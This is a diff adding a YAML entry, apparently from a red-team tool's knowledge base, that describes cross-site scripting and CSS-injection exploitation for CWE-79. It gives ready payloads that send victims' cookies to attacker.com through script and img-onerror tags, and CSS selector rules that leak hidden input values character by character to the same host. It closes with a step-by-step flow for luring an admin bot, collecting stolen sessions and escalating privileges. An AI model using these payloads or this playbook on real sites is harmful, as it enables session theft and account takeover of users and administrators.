@@ -1,0 +1,34 @@
+metadata:
+  id: cwe-79-xss-css
+  name: XSS / CSS Injection / Data Exfiltration
+  cwe_ids:
+  - CWE-79
+  target_type: generic
+  tags:
+  - xss
+  - css-injection
+  - stored-xss
+  - dom-based
+  - token-exfil
+  - admin-bot
+  - service-worker
+  author: co-redteam
+  severity: critical
+content: "Categories and exploitation scenarios:\n\n1. Stored XSS (persistent):\n\
+  \   - User profile, comments, product descriptions stored and viewed by others/admin\n\
+  \   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\
+  \   - Or: <img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\"\
+  >\n\n2. CSS Attribute Selector Exfiltration (stealing hidden values):\n   When page\
+  \ contains sensitive values in HTML elements like <input value=\"SECRET\">:\n  \
+  \ input[value^=\"a\"] { background:url(https://attacker.com/char?a) }\n   input[value^=\"\
+  ab\"] { background:url(https://attacker.com/prefix?ab) }\n   On match browser auto-sends\
+  \ request, leaking token/secret character by character.\n\n3. DOM-based XSS:\n \
+  \  Dangerous functions: innerHTML, document.write(), eval(), setTimeout(), location.hash\n\
+  \   Find unsanitized user input directly inserted into DOM\n\n4. Service Worker\
+  \ injection:\n   If app registers SW and SW source is controllable, can hijack all\
+  \ network requests\n   Inject malicious SW to intercept requests, steal cookies,\
+  \ modify responses\n\nGeneric exploitation flow:\nStep 1 - Inject payload into storable\
+  \ field (note/description/bio/name/etc.)\nStep 2 - Trigger admin/Bot to visit page\
+  \ containing payload (report feature, share link, etc.)\nStep 3 - Receive stolen\
+  \ data on attacker server (cookie/token/session)\nStep 4 - Use stolen credentials\
+  \ for privilege escalation\n"
